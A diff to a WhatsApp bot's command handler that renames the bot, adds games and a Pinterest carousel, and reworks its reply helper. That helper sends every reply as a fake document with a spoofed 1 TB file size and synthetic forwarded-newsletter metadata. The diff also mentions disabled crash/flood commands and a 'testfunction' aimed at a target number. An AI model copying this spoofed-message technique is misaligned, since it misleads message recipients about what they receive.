@@ -166,7 +166,8 @@ const contacts = Array.isArray(contactsData) ? contactsData : []
 const owners = Array.isArray(ownersData) ? ownersData : []
 const premium = Array.isArray(premiumData) ? premiumData : []
 const list = Array.isArray(listData) ? listData : []
-const { pinterest, pinterest2, remini, mediafire, tiktokDl, ephoto} = require('./library/scraper');
+const { pinterest, pinterest2, pinterestSearch, remini, mediafire, tiktokDl, ephoto} = require('./library/scraper');
+const { createPinterestCarouselSender, sendPinterestSearchFallback } = require('./library/pinterest-carousel.js');
 const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
 const { CatBox, TelegraPh, floNime, uptotelegra } = require('./library/uploader')
 const { getDevice } = require("@whiskeysockets/baileys")
@@ -174,8 +175,9 @@ const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom
 const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
 const { targetChannelData, loadTargetChannel, saveTargetChannel } = require('./library/upch.js');
 const { UploadFileUgu } = require('./library/uploader.js')
-const furinaV18Features = require('./library/XeryuuV17.js')
+const xeryuuV18Features = require('./library/XeryuuV17.js')
 const gameHub = require('./library/games.js')
+const xeryuuExtension = require('./library/xeryuu-extension.js')
 const tourlService = require('./library/tourl.js')
 const bratService = require('./library/brat.js')
 const indonesiaTools = require('./library/indonesia-tools.js')
@@ -576,6 +578,12 @@ function styleXeryuuReplyText(value) {
     if (!raw.trim() || /^\s*```[\s\S]*```\s*$/.test(raw)) return raw;
     return `\`\`\`${raw}\`\`\``;
 }
+const sendPinterestCarousel = createPinterestCarouselSender({
+    proto,
+    generateWAMessageFromContent,
+    prepareWAMessageMedia,
+    sleep
+});
 // 
 function applyQuoteContextToRelayPayload(payload, incomingMessage) {
     const key = incomingMessage?.key || {}
@@ -673,11 +681,23 @@ function normalizeOutboundMentionPayload(content) {
     }
 }
 
-function withDefaultQuotedReplies(baseConn, incomingMessage) {
-    if (!baseConn || typeof baseConn.sendMessage !== 'function' || !incomingMessage) return baseConn;
+function containsInteractivePayload(value, depth = 0) {
+    if (!value || typeof value !== 'object' || depth > 16) return false
+    if (Buffer.isBuffer(value) || value instanceof Uint8Array || value instanceof ArrayBuffer) return false
+    if (Object.prototype.hasOwnProperty.call(value, 'interactiveMessage') ||
+        Object.prototype.hasOwnProperty.call(value, 'carouselMessage')) return true
+    for (const [key, child] of Object.entries(value)) {
+        if (key === 'contextInfo' || key === 'messageContextInfo') continue
+        if (containsInteractivePayload(child, depth + 1)) return true
+    }
+    return false
+}
 
-    const hasQuoteableIncomingMessage = Boolean(incomingMessage?.key && incomingMessage?.message);
-    const normalizeJid = value => String(value || '').replace(/:\d+(?=@)/, '');
+function withDefaultQuotedReplies(baseConn, incomingMessage) {
+    if (!baseConn || typeof baseConn.sendMessage !== 'function' || !incomingMessage) return baseConn
+
+    const hasQuoteableIncomingMessage = Boolean(incomingMessage?.key && incomingMessage?.message)
+    const normalizeJid = value => String(value || '').replace(/:\d+(?=@)/, '')
 
     return new Proxy(baseConn, {
         get(target, property) {
@@ -685,9 +705,11 @@ function withDefaultQuotedReplies(baseConn, incomingMessage) {
                 return function relayMessageWithDefaultQuote(jid, payload, options, ...rest) {
                     const sameChat = normalizeJid(jid) === normalizeJid(incomingMessage?.chat)
                     const rootKeys = payload && typeof payload === 'object' ? Object.keys(payload) : []
-                    const specialPayload = rootKeys.some(key =>
+                    const specialPayload = containsInteractivePayload(payload) || rootKeys.some(key =>
                         ['protocolMessage', 'reactionMessage', 'pollUpdateMessage'].includes(key)
                     )
+                    // Interactive/native-flow messages must be relayed byte-for-byte as built.
+                    // Injecting quote context inside their nested protobuf can make WhatsApp drop them.
                     if (sameChat && hasQuoteableIncomingMessage && !specialPayload) {
                         const quotedPayload = applyQuoteContextToRelayPayload(payload, incomingMessage)
                         return Reflect.apply(target.relayMessage, target, [jid, quotedPayload, options, ...rest])
@@ -697,81 +719,35 @@ function withDefaultQuotedReplies(baseConn, incomingMessage) {
             }
             if (property === 'sendMessage') {
                 return async function sendMessageWithDefaultQuote(jid, content, options, ...rest) {
-                    const sameChat = normalizeJid(jid) === normalizeJid(incomingMessage?.chat);
+                    const sameChat = normalizeJid(jid) === normalizeJid(incomingMessage?.chat)
                     const specialPayload = content && typeof content === 'object' &&
                         ['react', 'delete', 'edit', 'protocolMessage', 'pollUpdateMessage'].some(key =>
                             Object.prototype.hasOwnProperty.call(content, key)
-                        );
+                        )
+                    // Do not inject synthetic newsletter/ad metadata or rewrite every text into a
+                    // code block. Those mutations were applied to ordinary responses and could
+                    // cause WhatsApp to silently reject replies while the command reaction succeeded.
+                    const outgoingContent = (!specialPayload)
+                        ? normalizeOutboundMentionPayload(content)
+                        : content
                     const optionsObject = options && typeof options === 'object' && !Array.isArray(options)
                         ? options
-                        : {};
-                    
-                    let outgoingContent = (!specialPayload)
-                        ? normalizeOutboundMentionPayload(content)
-                        : content;
-                        
-                    if (sameChat && !specialPayload &&
-                        outgoingContent && typeof outgoingContent === 'object' && typeof outgoingContent.text === 'string') {
-                        const allowedTextKeys = new Set(['text', 'mentions', 'contextInfo']);
-                        const isPlainTextPayload = Object.keys(outgoingContent).every(key => allowedTextKeys.has(key));
-                        if (isPlainTextPayload) {
-                            const originalText = outgoingContent.text;
-                         
-                            const isMenuOrAlreadyFormatted = isMenuOrFormattedXeryuuReply(originalText);
-                            const styledText = isMenuOrAlreadyFormatted
-                                ? originalText
-                                : styleXeryuuReplyText(originalText);
-                            const existingContext = outgoingContent.contextInfo && typeof outgoingContent.contextInfo === 'object'
-                                ? outgoingContent.contextInfo
-                                : {};
-                            const styledContext = { ...existingContext };
-                  
-                            const suppressBotMetadata = styledContext.__xeryuuSuppressBotMetadata === true;
-                            const suppressExternalAdReply = suppressBotMetadata || styledContext.__xeryuuSuppressExternalAdReply === true;
-                            delete styledContext.__xeryuuSuppressBotMetadata;
-                            delete styledContext.__xeryuuSuppressExternalAdReply;
-                            if (!suppressBotMetadata) {
-                                styledContext.isForwarded = styledContext.isForwarded ?? true;
-                                styledContext.forwardingScore = styledContext.forwardingScore ?? 256;
-                                styledContext.forwardedNewsletterMessageInfo = styledContext.forwardedNewsletterMessageInfo || {
-                                    newsletterJid: '120363426041078526@newsletter',
-                                    newsletterName: '$ cd ./root/¡χηαℓz¿ 彡',
-                                    serverMessageId: -1
-                                };
-                                
-                                if (!suppressExternalAdReply && !styledContext.externalAdReply) {
-                                    styledContext.externalAdReply = {
-                                        title: 'XERYUU-MD V16',
-                                        body: 'created by: XnalzNotDev',
-                                        thumbnail: readProjectAsset('media/xeryuu.png'),
-                                        mediaType: 1,
-                                        renderLargerThumbnail: false
-                                    };
-                                }
-                            }
-                            outgoingContent = {
-                                ...outgoingContent,
-                                text: styledText,
-                                ...(Object.keys(styledContext).length ? { contextInfo: styledContext } : {})
-                            };
-                        }
-                    }
-
-                    if (sameChat && hasQuoteableIncomingMessage && !specialPayload) {
+                        : {}
+                    if (sameChat && hasQuoteableIncomingMessage && !specialPayload && !optionsObject.quoted) {
                         return Reflect.apply(target.sendMessage, target, [
                             jid, outgoingContent, { ...optionsObject, quoted: incomingMessage }, ...rest
-                        ]);
+                        ])
                     }
-                    return Reflect.apply(target.sendMessage, target, [jid, outgoingContent, options, ...rest]);
-                };
+                    return Reflect.apply(target.sendMessage, target, [jid, outgoingContent, options, ...rest])
+                }
             }
-            const value = Reflect.get(target, property, target);
-            return typeof value === 'function' ? value.bind(target) : value;
+            const value = Reflect.get(target, property, target)
+            return typeof value === 'function' ? value.bind(target) : value
         },
         set(target, property, value) {
-            return Reflect.set(target, property, value, target);
+            return Reflect.set(target, property, value, target)
         }
-    });
+    })
 }
 
 module.exports = async (conn, m, chatUpdate, store) => {
@@ -1765,7 +1741,7 @@ if (m.isGroup) {
     // kalau antilink biasa aktif
     if (antilinkGroups.includes(m.chat)) {
       await conn.sendMessage(m.chat, { delete: m.key })
-      replyV1("🚫 Link grup terdeteksi!")
+      await replyV1("🚫 Link grup terdeteksi!")
     }
     // kalau antilink2 (kick) aktif
     if (AntiLinkKick.includes(m.chat)) {
@@ -1845,7 +1821,7 @@ if (m.isGroup && !m.key.fromMe && antitoxic[m.chat]?.active) {
       try {
         await conn.groupParticipantsUpdate(m.chat, [user], 'remove')
       } catch (e) {
-        replyV1('Gagal kick. Bot bukan admin?')
+        await replyV1('Gagal kick. Bot bukan admin?')
       }
       delete antitoxic[m.chat].warnings[user]
       saveAntiToxic()
@@ -1919,11 +1895,18 @@ mentions:[m.sender]
 // anti link channel
 //############ [ GAME MODULE ]
 try {
-    gameHub.restoreLegacyTimers(conn)
+    xeryuuExtension.restoreTimers(conn, (chat, timeoutText) => replyV1(timeoutText, { chatOverride: chat, includeSenderMention: false, quoted: null, fallbackQuoted: null }))
+    gameHub.restoreLegacyTimers(conn, (chat, timeoutText, quoteMessage) => replyV1(timeoutText, {
+        chatOverride: chat,
+        includeSenderMention: false,
+        quoted: quoteMessage || null,
+        fallbackQuoted: quoteMessage || null
+    }))
     await gameHub.processLegacyAnswer({
         conn,
         m,
         body,
+        reply: (message, options = {}) => replyV1(message, options),
         rewardLimit: (jid, amount) => {
             const user = global.db?.users?.[jid]
             if (!user) return
@@ -1934,7 +1917,10 @@ try {
     console.error('Error Game Module:', err.message)
 }
 try {
-    const handledCaklontong = await caklontongService.processAnswer({ conn, m, body, isCmd })
+    const handledCaklontong = await caklontongService.processAnswer({
+        conn, m, body, isCmd,
+        reply: (message, options = {}) => replyV1(message, options)
+    })
     if (handledCaklontong) return
 } catch (err) {
     console.error('[CAKLONTONG ANSWER]', err?.stack || err)
@@ -1982,7 +1968,7 @@ if (m.isGroup && !m.key.fromMe && antichannel[m.chat]?.antichannel) {
         try {
           await conn.groupParticipantsUpdate(m.chat, [user], 'remove')
         } catch (e) {
-          replyV1('Gagal kick. Bot bukan admin?')
+          await replyV1('Gagal kick. Bot bukan admin?')
         }
         delete antichannel[m.chat].warnings[user]
         saveAntichannel()
@@ -2272,70 +2258,103 @@ const audio = async (content) => {
     }, { quoted: m });
 };
 
-const replyV1 = async (teks, options = {}) => {
+async function replyV1(teks, options = {}) {
   const normalizedOptions = options && typeof options === 'object' && !Array.isArray(options)
     ? options
     : {};
   const optionMentions = Array.isArray(normalizedOptions.mentions)
     ? normalizedOptions.mentions
     : [];
-  const mentions = [...new Set([m?.sender, ...optionMentions].filter(Boolean))];
+  const senderMentions = normalizedOptions.includeSenderMention === false ? [] : [m?.sender];
+  const mentions = [...new Set([...senderMentions, ...optionMentions].filter(Boolean))];
   const styledText = styleXeryuuReplyText(teks);
   const thumbnail = readProjectAsset('media/XeryuMd-thumbnail.jpg');
+  const customContextInfo = normalizedOptions.contextInfo && typeof normalizedOptions.contextInfo === 'object'
+    ? normalizedOptions.contextInfo
+    : {};
+  const noAdReply = normalizedOptions.noAdReply === true;
+  const targetChat = normalizedOptions.chatOverride || m.chat;
+  const quote = Object.prototype.hasOwnProperty.call(normalizedOptions, 'quoted')
+    ? normalizedOptions.quoted
+    : m;
+  const sendOptions = quote ? { quoted: quote } : {};
+  const metadataContext = noAdReply ? {} : {
+    forwardingScore: 9999,
+    isForwarded: false,
+    forwardedNewsletterMessageInfo: {
+      newsletterJid: global.idSaluran || '120363426041078526@newsletter',
+      newsletterName: global.namaSaluran || global.botname || 'Xeryuu-MD',
+      serverMessageId: 127
+    }
+  };
+  const fakeDocument = Buffer.from('Xeryuu | MD✨');
   const payload = {
-    document: Buffer.from('Xeryuu | MD✨'),
+    document: fakeDocument,
     mimetype: 'image/jpg',
-    fileName: global.botname || botname,
+    fileName: global.botname || global.botname2 || 'Xeryuu-MD',
     fileLength: 1099511627776,
     caption: styledText,
     mentions,
     contextInfo: {
-      ...(normalizedOptions.contextInfo && typeof normalizedOptions.contextInfo === 'object'
-        ? normalizedOptions.contextInfo
-        : {}),
-      forwardingScore: 9999,
-      isForwarded: false,
-      forwardedNewsletterMessageInfo: {
-        newsletterJid: global.idSaluran || idSaluran, 
-        newsletterName: global.namaSaluran || namaSaluran, 
-        serverMessageId: 127
-      }
+      ...customContextInfo,
+      ...metadataContext
     }
   };
   if (Buffer.isBuffer(thumbnail) && thumbnail.length) payload.jpegThumbnail = thumbnail;
 
   try {
-    return await conn.sendMessage(m.chat, payload, { quoted: m });
+    return await conn.sendMessage(targetChat, payload, sendOptions);
   } catch (firstError) {
+    // Fallback tetap memakai dokumen palsu yang sama; jangan diam-diam berubah
+    // menjadi balasan teks biasa karena itu membuat perilaku replyV1 tidak konsisten.
     try {
-      return await conn.sendMessage(m.chat, {
-        text: styledText,
+      const fallbackPayload = {
+        document: fakeDocument,
+        mimetype: 'image/jpg',
+        fileName: global.botname || global.botname2 || 'Xeryuu-MD',
+        fileLength: 1099511627776,
+        caption: styledText,
         mentions,
-        contextInfo: { __xeryuuSuppressBotMetadata: true }
-      }, { quoted: qtoko });
+        contextInfo: {
+          ...customContextInfo,
+          ...metadataContext
+        }
+      };
+      const fallbackQuote = Object.prototype.hasOwnProperty.call(normalizedOptions, 'fallbackQuoted')
+        ? normalizedOptions.fallbackQuoted
+        : qtoko;
+      const fallbackSendOptions = fallbackQuote ? { quoted: fallbackQuote } : {};
+      return await conn.sendMessage(targetChat, fallbackPayload, fallbackSendOptions);
     } catch (secondError) {
       console.error(
         '[REPLY V1 ERROR]',
         firstError?.message || firstError,
-        'fallback:',
+        'fallback document:',
         secondError?.message || secondError
       );
       throw secondError;
     }
   }
-};
+}
 
-// Compatibility helper for replytolak-style handlers imported from Furina.
-// It intentionally shares Xeryuu's normal, triple-backtick reply path.
+function replyV1Safe(...args) {
+  return replyV1(...args).catch(error => {
+    console.error('[REPLY V1 CALLBACK ERROR]', error?.stack || error);
+    return null;
+  });
+}
+
+// Compatibility helper for replytolak-style handlers imported from Xeryuu.
+// All reply aliases preserve Xeryuu V17's fake-document replyV1 behavior.
 const replytolak = async (teks, options = {}) => replyV1(teks, options);
 
 const Reply = async (content, options = {}) => replyV1(content, options);
-// Furina V18 reply helper names kept for handler compatibility, but routed through
-// Xeryuu's plain-text, quoted reply to avoid fake-document / synthetic-forward metadata.
-const replyFurina = async (content) => replyV1(content);
-const replyFurina1 = async (content) => replyV1(content);
-const replytolak1 = async (content) => replyV1(content);
-const reply = async (content) => replyV1(content);
+// Xeryuu V18 reply helper names kept for handler compatibility and routed through
+// Xeryuu's fake-document replyV1 implementation.
+const replyXeryuu = async (content, options = {}) => replyV1(content, options);
+const replyXeryuu1 = async (content, options = {}) => replyV1(content, options);
+const replytolak1 = async (content, options = {}) => replyV1(content, options);
+const reply = async (content, options = {}) => replyV1(content, options);
 async function replyprem() {
     return replyV1('🔒 Fitur ini khusus pengguna premium. Hubungi developer untuk informasi akses.');
 }
@@ -8861,7 +8880,7 @@ const isOwnJid = (jid, candidates = []) => {
 
 if (!isCmd && !isPlayNumberReply && m?.isGroup && !m?.key?.fromMe) {
     try {
-        const handledGroupMedia = await furinaV18Features.handleGroupMediaAutomation(conn, m, isBotAdmins, isCmd)
+        const handledGroupMedia = await xeryuuV18Features.handleGroupMediaAutomation(conn, m, isBotAdmins, isCmd)
         if (handledGroupMedia) return
     } catch (error) {
         console.error('[GROUP MEDIA AUTOMATION ERROR]', error?.stack || error)
@@ -9297,6 +9316,44 @@ if (DISABLED_CRASH_FLOOD_COMMANDS.has(String(command || '').toLowerCase())) {
     return replyV1('🛡️ Command crash/spam dinonaktifkan demi mencegah gangguan pada akun atau grup lain.');
 }
 
+// Game answers are checked before command routing; all extension replies go through replyV1.
+try {
+    const handledXeryuuAnswer = await xeryuuExtension.processAnswer({
+        conn,
+        m,
+        body,
+        isCmd,
+        economy,
+        reply: replyV1,
+        saveGlobalDb: () => saveDB(global.db)
+    });
+    if (handledXeryuuAnswer) return;
+} catch (error) {
+    console.error('[XERYUU GAME ANSWER]', error?.stack || error);
+}
+
+// Disable the legacy coercive command before its old switch-case can run.
+if (['ewe-paksa', 'ewepaksa'].includes(String(command || '').toLowerCase())) {
+    return replyV1('🛡️ Command ini dinonaktifkan. Gunakan .duel untuk permainan kompetitif yang aman.');
+}
+
+try {
+    const handledXeryuuCommand = await xeryuuExtension.handle(command, {
+        conn,
+        m,
+        args,
+        text,
+        prefix,
+        economy,
+        reply: replyV1,
+        saveGlobalDb: () => saveDB(global.db)
+    });
+    if (handledXeryuuCommand) return;
+} catch (error) {
+    console.error('[XERYUU EXTENSION COMMAND]', error?.stack || error);
+    return replyV1(`❌ Perintah game/RPG gagal diproses. Detail: ${String(error?.message || error).slice(0, 220)}`);
+}
+
 switch (command) {
 case 'gachanomor': {
     // This command intentionally produces a clearly dummy/fictional example.
@@ -9580,7 +9637,7 @@ case 'listid': {
 case 'addhyd':
 case 'addalya': {
     if (!isCreator) return replyV1(mess.owner);
-    return replyV1(`⚠️ ${command} belum memiliki implementasi fungsional di source Furina V18 yang diberikan (hanya tercantum di menu). Tidak ada perubahan atau request API yang dijalankan agar bot tidak melakukan tindakan yang ditebak-tebak.`);
+    return replyV1(`⚠️ ${command} belum memiliki implementasi fungsional di source Xeryuu V18 yang diberikan (hanya tercantum di menu). Tidak ada perubahan atau request API yang dijalankan agar bot tidak melakukan tindakan yang ditebak-tebak.`);
 }
 case 'richgamepage': {
     const page = Number(args[0] || 1)
@@ -9791,7 +9848,7 @@ case 'fchess':
 case 'chessultimate':
 case 'richchess2': {
     try { await sendRichHtmlGame(conn, m.chat, 'chess-ultimate') }
-    catch (error) { console.error('[RICHHTML chess ultimate]', error?.stack || error); await replyV1(`❌ Gagal membuka Chess Furina Ultimate: ${error?.message || error}`) }
+    catch (error) { console.error('[RICHHTML chess ultimate]', error?.stack || error); await replyV1(`❌ Gagal membuka Chess Xeryuu Ultimate: ${error?.message || error}`) }
     break
 }
 
@@ -9955,7 +10012,7 @@ case 'caklontong': {
         await caklontongService.start({
             conn,
             m,
-            reply: async message => conn.sendMessage(m.chat, { text: String(message ?? '') }, { quoted: m })
+            reply: (message, options = {}) => replyV1(message, options)
         })
     } catch (error) {
         console.error('[CAKLONTONG START]', error?.stack || error)
@@ -9973,6 +10030,7 @@ case 'cepat':
 case 'susunkata':
 case 'tebakgambar':
 case 'tebakbendera':
+case 'tebakbenderav2':
 case 'tebakkimia':
 case 'family100':
 case 'f100':
@@ -9990,7 +10048,7 @@ case 'mathbattle':
 case 'gamestats':
 case 'gamerank':
 case 'gamehelp': {
-    const normalizedGameCommand = command === 'cepat' ? 'cepattepat' : command === 'f100' ? 'family100' : command
+    const normalizedGameCommand = command === 'cepat' ? 'cepattepat' : command === 'f100' ? 'family100' : command === 'tebakbenderav2' ? 'tebakbendera' : command
     let handled
     const legacyNames = new Set(['asahotak','tebakkata','tebakemoji','siapaaku','cepattepat','susunkata','tebakgambar','tebakbendera','tebakkimia','family100'])
     const commonCtx = {
@@ -10000,13 +10058,29 @@ case 'gamehelp': {
         text,
         prefix,
         reply: async (message, extra = {}) => {
-            const payload = { text: String(message ?? ''), ...extra }
-            if (!payload.contextInfo) {
-                payload.contextInfo = {
-                    mentionedJid: Array.isArray(payload.mentions) ? payload.mentions : []
+            const options = extra && typeof extra === 'object' && !Array.isArray(extra) ? { ...extra } : {}
+            const allowedReplyOptions = new Set(['mentions', 'contextInfo', 'noAdReply', 'includeSenderMention', 'quoted', 'fallbackQuoted', 'chatOverride'])
+            const textOnlyReply = Object.keys(options).every(key => allowedReplyOptions.has(key))
+            if (textOnlyReply) {
+                const mentionList = Array.isArray(options.mentions) ? options.mentions : []
+                if (mentionList.length) {
+                    options.contextInfo = {
+                        ...(options.contextInfo && typeof options.contextInfo === 'object' ? options.contextInfo : {}),
+                        mentionedJid: mentionList
+                    }
                 }
+                return replyV1(message, options)
             }
-            return conn.sendMessage(m.chat, payload, { quoted: m })
+            const payload = { text: String(message ?? ''), ...options }
+            if (!payload.contextInfo && Array.isArray(payload.mentions) && payload.mentions.length) {
+                payload.contextInfo = { mentionedJid: payload.mentions }
+            }
+            try {
+                return await conn.sendMessage(m.chat, payload, { quoted: m })
+            } catch (sendError) {
+                console.error('[GAME REPLY SEND]', sendError?.stack || sendError)
+                throw sendError
+            }
         }
     }
     if (legacyNames.has(normalizedGameCommand)) {
@@ -13293,7 +13367,7 @@ case "testfunction": {
 }
 
 if (!adaError) {
-    replyV1(
+    await replyV1(
 `✅ Success Testing Function!
 
 - Target : ${nomor}
@@ -13398,7 +13472,7 @@ let target = m.mentionedJid[0] || m.sender
 
 let device = m.key.id.length > 21 ? "Android 🤖" : "WhatsApp Web / iPhone 🍎"
 
-replyV1(`📱 Device Info
+await replyV1(`📱 Device Info
 User: @${target.split("@")[0]}
 Device: ${device}`, { mentions: [target] })
 }
@@ -13408,12 +13482,12 @@ if (!isOwner) return replyV1("Owner only")
 
 if (args[0] === "on") {
 autoRes = true
-replyV1("Auto respon diaktifkan")
+await replyV1("Auto respon diaktifkan")
 } else if (args[0] === "off") {
 autoRes = false
-replyV1("Auto respon dimatikan")
+await replyV1("Auto respon dimatikan")
 } else {
-replyV1("Contoh:\n.autores on\n.autores off")
+await replyV1("Contoh:\n.autores on\n.autores off")
 }
 }
 break
@@ -13421,14 +13495,14 @@ case "xnalzairespon": {
 if (!isCreator) return replyV1(mess.owner)
 if (args[0] === "on") {
 xnalzAuto = true
-replyV1("✅ Auto respon XnalzNotDev diaktifkan")
+await replyV1("✅ Auto respon XnalzNotDev diaktifkan")
 } 
 else if (args[0] === "off") {
 xnalzAuto = false
-replyV1("❌ Auto respon XnalzNotDev dimatikan")
+await replyV1("❌ Auto respon XnalzNotDev dimatikan")
 } 
 else {
-replyV1("contoh:\n.xnalzairespon on\n.xnalzairespon off")
+await replyV1("contoh:\n.xnalzairespon on\n.xnalzairespon off")
 }
 
 }
@@ -13471,7 +13545,7 @@ let hasil = data.slice(0, posisi) + caseBaru + "\n" + data.slice(posisi)
 
 fs.writeFileSync(path, hasil)
 
-replyV1("✅ Case berhasil ditambahkan")
+void replyV1Safe("✅ Case berhasil ditambahkan")
 })
 }
 break
@@ -13516,7 +13590,7 @@ fs.writeFileSync(filePath, newFile)
 console.log("✅ Case berhasil ditambahkan")
 console.log("===== ADDCASE END =====")
 
-replyV1("✅ Case berhasil ditambahkan")
+await replyV1("✅ Case berhasil ditambahkan")
 }
 break
 
@@ -13548,7 +13622,7 @@ fs.writeFileSync(filePath, newFile)
 console.log(chalk.red("✅ Case berhasil dihapus")) 
 console.log(chalk.red("===== DELCASE END =====")) 
 
-replyV1("✅ Case berhasil dihapus")
+await replyV1("✅ Case berhasil dihapus")
 }
 break
 case "allmenugif":
@@ -13702,7 +13776,7 @@ Bot WhatsApp ini dibuat oleh *XnalzNotDev* untuk membantu tools, manajemen grup,
  ⪩ .brat <teks>
  ⪩ .bratimg <teks | warna teks | warna latar>
  ⪩ .bratvideo <teks>
- ⪩ .furinabrat <teks>
+ ⪩ .xeryuubrat <teks>
  ⪩ .bratbahlil <teks>
 
 \`🔗 LINK & UTILITY\`
@@ -14102,9 +14176,9 @@ Bot WhatsApp ini dibuat oleh *XnalzNotDev* untuk membantu tools, manajemen grup,
 \`🚀 SPECIAL\`
  ⪩ .polisi
  ⪩ .roket
- ⪩ .wikwik
+ ⪩ .wikwik (dinonaktifkan)
  ⪩ .ewe-paksa
- ⪩ .open-bo
+ ⪩ .open-bo (dinonaktifkan)
  ⪩ .joinrpg
  ⪩ .exitrpg
  ⪩ .atmall
@@ -14737,7 +14811,7 @@ text: `
  ⪩ .brat <teks>
  ⪩ .bratimg <teks | warna teks | warna latar>
  ⪩ .bratvideo <teks>
- ⪩ .furinabrat <teks>
+ ⪩ .xeryuubrat <teks>
  ⪩ .bratbahlil <teks>
 
 \`🔗 LINK & UTILITY\`
@@ -15137,12 +15211,96 @@ text: `
 \`🚀 SPECIAL\`
  ⪩ .polisi
  ⪩ .roket
- ⪩ .wikwik
- ⪩ .ewe-paksa
- ⪩ .open-bo
+ ⪩ .wikwik (dinonaktifkan)
+ ⪩ .ewe-paksa (dinonaktifkan)
+ ⪩ .open-bo (dinonaktifkan)
  ⪩ .joinrpg
  ⪩ .exitrpg
  ⪩ .atmall
+
+┏『 乂 ɢ ᴀ ᴍ ᴇ - ᴍ ᴇ ɴ ᴜ 乂 』─✦
+│⦿ 〔 ${prefix}tebakanml
+│⦿ 〔 ${prefix}tebakgame
+│⦿ 〔 ${prefix}tebaklogo
+│⦿ 〔 ${prefix}tebaksurah
+│⦿ 〔 ${prefix}blackjack
+│⦿ 〔 ${prefix}tebakkata
+│⦿ 〔 ${prefix}tebaktebakan
+│⦿ 〔 ${prefix}tebaklirik
+│⦿ 〔 ${prefix}tebakgambar
+│⦿ 〔 ${prefix}tebaklagu
+│⦿ 〔 ${prefix}tebakkimia
+│⦿ 〔 ${prefix}asahotak
+│⦿ 〔 ${prefix}siapaaku
+│⦿ 〔 ${prefix}susunkata
+│⦿ 〔 ${prefix}tekateki
+│⦿ 〔 ${prefix}tebakbendera
+│⦿ 〔 ${prefix}tebakbenderav2
+│⦿ 〔 ${prefix}tebakkabupaten
+│⦿ 〔 ${prefix}caklontong
+│⦿ 〔 ${prefix}family100
+│⦿ 〔 ${prefix}werewolf
+│⦿ 〔 ${prefix}nyerah
+◣──────────❈
+
+┏『 乂 ʀ ᴘ ɢ - ᴍ ᴇ ɴ ᴜ 乂 』─✦
+│⦿ 〔 ${prefix}kerja
+│⦿ 〔 ${prefix}fightnaga
+│⦿ 〔 ${prefix}fightkucing
+│⦿ 〔 ${prefix}fightphonix
+│⦿ 〔 ${prefix}fightgriffin
+│⦿ 〔 ${prefix}fightkyubi
+│⦿ 〔 ${prefix}fightcentaur
+│⦿ 〔 ${prefix}nabung
+│⦿ 〔 ${prefix}mining
+│⦿ 〔 ${prefix}bankcek
+│⦿ 〔 ${prefix}maling
+│⦿ 〔 ${prefix}banknabung
+│⦿ 〔 ${prefix}banktarik
+│⦿ 〔 ${prefix}berkebon
+│⦿ 〔 ${prefix}crafting
+│⦿ 〔 ${prefix}bet
+│⦿ 〔 ${prefix}bonus
+│⦿ 〔 ${prefix}buah
+│⦿ 〔 ${prefix}nebang
+│⦿ 〔 ${prefix}bekerja
+│⦿ 〔 ${prefix}bansos
+│⦿ 〔 ${prefix}taxy
+│⦿ 〔 ${prefix}mulung
+│⦿ 〔 ${prefix}berburu
+│⦿ 〔 ${prefix}polisi
+│⦿ 〔 ${prefix}berdagang
+│⦿ 〔 ${prefix}rampok
+│⦿ 〔 ${prefix}bunuh
+│⦿ 〔 ${prefix}collect
+│⦿ 〔 ${prefix}mancing
+│⦿ 〔 ${prefix}repair
+│⦿ 〔 ${prefix}feed
+│⦿ 〔 ${prefix}fight
+│⦿ 〔 ${prefix}gajian
+│⦿ 〔 ${prefix}upgrade
+│⦿ 〔 ${prefix}transfer
+│⦿ 〔 ${prefix}shop
+│⦿ 〔 ${prefix}selectskill
+│⦿ 〔 ${prefix}sampah
+│⦿ 〔 ${prefix}roket
+│⦿ 〔 ${prefix}ojek
+│⦿ 〔 ${prefix}nguli
+│⦿ 〔 ${prefix}pasar
+│⦿ 〔 ${prefix}rob
+│⦿ 〔 ${prefix}referal
+│⦿ 〔 ${prefix}petshop
+│⦿ 〔 ${prefix}kolam
+│⦿ 〔 ${prefix}koboy
+│⦿ 〔 ${prefix}leaderboard
+│⦿ 〔 ${prefix}casino
+│⦿ 〔 ${prefix}ewe-paksa (dinonaktifkan)
+│⦿ 〔 ${prefix}duel
+│⦿ 〔 ${prefix}petualang
+│⦿ 〔 ${prefix}perangsarung
+│⦿ 〔 ${prefix}ulartangga
+│⦿ 〔 ${prefix}slot
+◣──────────❈
 
 \`🔮 RAMALAN\`
  ⪩ .artinama
@@ -15499,6 +15657,14 @@ display_text: "⌞愛⌝ Game Menu ⛈️",
 id: `${prefix}gamemenu`
 }) 
 },
+
+{
+name: "quick_reply",
+buttonParamsJson: JSON.stringify({
+display_text: "🛍️ Website Store",
+id: `${prefix}store`
+})
+},
  
 {
 name: "quick_reply", 
@@ -15670,7 +15836,7 @@ if (argsLower === "on") {
 antilink[m.chat].antilinkall = true
 saveAntilink()
 
-replyV1("✅ AntiLink Semua AKTIF!")
+await replyV1("✅ AntiLink Semua AKTIF!")
 
 }
 
@@ -15679,13 +15845,13 @@ else if (argsLower === "off") {
 antilink[m.chat].antilinkall = false
 saveAntilink()
 
-replyV1("❌ AntiLink Semua NONAKTIF!")
+await replyV1("❌ AntiLink Semua NONAKTIF!")
 
 }
 
 else {
 
-replyV1(`Contoh:\n${prefix}antilinkall on\n${prefix}antilinkall off`)
+await replyV1(`Contoh:\n${prefix}antilinkall on\n${prefix}antilinkall off`)
 
 }
 
@@ -15806,6 +15972,7 @@ Bot WhatsApp ini dibuat oleh *XnalzNotDev* untuk membantu tools, manajemen grup,
                 { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "⌞愛⌝ Create Panel ⛈️", id: `${prefix}cpanel` }) },
                 { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "⌞愛⌝ Buy Script ⛈️", id: `${prefix}buysc` }) },
                 { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "⌞愛⌝ Game Menu ⛈️", id: `${prefix}gamemenu` }) },
